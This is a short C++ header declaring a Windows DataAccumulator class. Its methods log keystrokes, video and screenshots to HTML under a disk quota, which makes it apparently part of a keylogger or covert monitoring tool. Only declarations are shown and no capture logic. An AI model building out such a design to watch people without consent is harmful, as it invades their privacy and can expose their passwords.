#pragma once
#include <Windows.h>
#include "DiskQuotaWatcher.h"

class DataAccumulator
{
private:
	DiskQuotaWatcher* quotaWatcher;
	//PSYSTEMTIME mLastLogTime;
	PFILETIME mLastLogTime;
	int GetElapsedSecondsFromLastLog();
	void Log2HTML(PSTR htmlString);

public:
	DataAccumulator(void);
	~DataAccumulator(void);
	void SetDiskQuota(int quota) { quotaWatcher->SetQuota(quota);}
	void RegisterNewFile(wchar_t* fileName) { quotaWatcher->RegisterNewFile(fileName); }
	void LogKey(PWSTR key);
	void LogVideo(PTSTR videoFile);
	void LogPrintScreen(PTSTR imageFile);
};

